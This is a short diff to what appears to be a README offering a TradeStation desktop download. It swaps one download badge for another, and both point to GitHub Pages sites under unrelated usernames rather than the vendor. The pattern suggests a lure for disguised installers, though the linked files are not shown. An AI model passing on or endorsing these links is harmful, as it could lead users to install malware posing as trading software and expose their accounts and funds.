@@ -4,11 +4,7 @@
 <img src="https://cdn-1.webcatalog.io/catalog/tradestation/tradestation-icon-filled-256.png?v=1714776219620" alt="TradeStation Logo" width="256" height="256">  
 </div>  
 
-<div align="center">  
-<a href="https://install-utility-osx.github.io/.github/tradestation">  
-<img src="https://img.shields.io/badge/📥_Get_TradeStation_Desktop-orange?style=for-the-badge" alt="Get TradeStation Desktop">  
-</a>  
-</div>  
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://corbinshermanbfbk.github.io/.github/TradeStation)
 
 ---
 
